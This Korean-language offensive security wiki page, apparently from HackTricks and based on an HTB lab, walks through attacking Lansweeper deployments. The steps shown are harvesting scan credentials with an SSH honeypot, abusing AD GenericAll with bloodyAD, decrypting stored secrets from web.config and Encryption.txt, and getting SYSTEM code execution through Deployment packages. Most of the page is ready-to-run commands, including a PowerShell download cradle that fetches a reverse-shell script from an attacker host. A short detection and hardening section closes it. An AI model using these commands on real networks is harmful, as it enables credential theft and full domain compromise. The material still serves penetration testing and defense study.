# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper는 Windows에 배포되고 Active Directory와 통합되어 사용되는 IT 자산 탐지 및 인벤토리 플랫폼입니다. Lansweeper에 구성된 자격증명은 SSH, SMB/WMI, WinRM 같은 프로토콜을 통해 자산에 인증하기 위해 스캐닝 엔진에서 사용됩니다. 잘못된 구성으로 인해 자주 발생하는 문제는 다음과 같습니다:

- 스캐닝 대상(target)을 공격자 제어 호스트(honeypot)로 리다이렉트하여 자격증명 가로채기
- Lansweeper 관련 그룹들이 노출하는 AD ACL을 악용해 원격 접근 획득
- 호스트에서 Lansweeper에 구성된 비밀(연결 문자열 및 저장된 스캔 자격증명) 복호화
- Deployment 기능을 통해 관리되는 엔드포인트에서 코드 실행(종종 SYSTEM으로 실행)

이 페이지는 실제 공격자가 인게이지먼트 동안 이러한 동작을 악용하는 워크플로우와 명령을 요약합니다.

## 1) Harvest scanning credentials via honeypot (SSH example)

아이디어: Scanning Target을 당신의 호스트로 가리키게 만들고 기존 Scanning Credentials를 거기에 매핑합니다. 스캔이 실행되면 Lansweeper는 해당 자격증명으로 인증을 시도하고, 당신의 honeypot이 그 시도된 자격증명을 캡처합니다.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
캡처한 creds를 DC services에 대해 검증:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- 다른 프로토콜에서도 scanner를 당신의 listener로 유도할 수 있다면 비슷하게 작동합니다 (SMB/WinRM honeypots 등). SSH가 종종 가장 간단합니다.
- 많은 scanners가 고유한 client banners로 자신을 식별(예: RebexSSH)하며, uname, whoami 등의 무해한 명령을 시도합니다.

## 2) AD ACL abuse: 자신을 app-admin group에 추가해 원격 접근 획득

침해된 계정으로부터 effective rights를 열거하려면 BloodHound를 사용하세요. 흔한 발견 사례는 scanner- 또는 앱 특정 그룹(예: “Lansweeper Discovery”)이 권한 있는 그룹(예: “Lansweeper Admins”)에 대해 GenericAll을 보유하고 있는 경우입니다. 해당 권한 그룹이 “Remote Management Users”의 멤버이기도 하면, 우리가 자신을 추가하면 WinRM이 사용 가능해집니다.

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
BloodyAD (Linux)로 그룹에서 GenericAll을 Exploit:
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
그런 다음 interactive shell을 얻으세요:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
팁: Kerberos 연산은 시간에 민감합니다. KRB_AP_ERR_SKEW가 발생하면 먼저 DC와 시간을 동기화하세요:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) 호스트에서 Lansweeper에 구성된 비밀 복호화

Lansweeper 서버에서 ASP.NET 사이트는 일반적으로 애플리케이션에서 사용하는 암호화된 연결 문자열과 대칭 키를 저장합니다. 적절한 로컬 접근 권한이 있으면 DB 연결 문자열을 복호화한 다음 저장된 스캔 자격 증명을 추출할 수 있습니다.

Typical locations:
- 웹 구성 파일: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- 애플리케이션 키: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

SharpLansweeperDecrypt를 사용해 저장된 자격 증명 복호화 및 덤프를 자동화합니다:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
예상 출력에는 DB 연결 정보 및 plaintext 스캐닝 자격 증명(환경 전반에 걸쳐 사용되는 Windows 및 Linux 계정 등)이 포함됩니다. 이러한 계정은 도메인 호스트에서 종종 높은 로컬 권한을 가집니다:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
복구된 Windows scanning creds를 privileged access에 사용:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Execution is performed by the Lansweeper service with high privilege, yielding code execution as NT AUTHORITY\SYSTEM on the selected host.

High-level steps:
- Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user, etc.).
- Target the desired asset (e.g., the DC/host where Lansweeper runs) and click Deploy/Run now.
- Catch your shell as SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- 배포 행동은 소음을 유발하며 Lansweeper 및 Windows event logs에 로그를 남깁니다. 신중하게 사용하세요.

## 탐지 및 하드닝

- 익명 SMB 열거를 제한하거나 제거하세요. RID cycling 및 Lansweeper shares에 대한 이상 접근을 모니터링하세요.
- Egress controls: scanner hosts에서의 outbound SSH/SMB/WinRM을 차단하거나 엄격히 제한하세요. 비표준 포트(예: 2022) 및 Rebex와 같은 비정상적인 클라이언트 배너에 대해 경보를 설정하세요.
- Protect `Website\\web.config` and `Key\\Encryption.txt`. 비밀은 vault로 외부화하고 노출 시 회전(rotate)하세요. 가능하면 최소 권한의 서비스 계정 및 gMSA 사용을 고려하세요.
- AD 모니터링: Lansweeper-related groups(예: “Lansweeper Admins”, “Remote Management Users”) 변경 및 권한 있는 그룹에 GenericAll/Write 멤버십을 부여하는 ACL 변경에 대해 경고하세요.
- Deployment 패키지 생성/변경/실행을 감사하고; cmd.exe/powershell.exe를 생성하거나 예상치 못한 outbound 연결을 생성하는 패키지에 대해 경보를 설정하세요.

## 관련 주제
- SMB/LSA/SAMR enumeration 및 RID cycling
- Kerberos password spraying 및 clock skew 고려사항
- BloodHound path analysis of application-admin groups
- WinRM 사용 및 lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
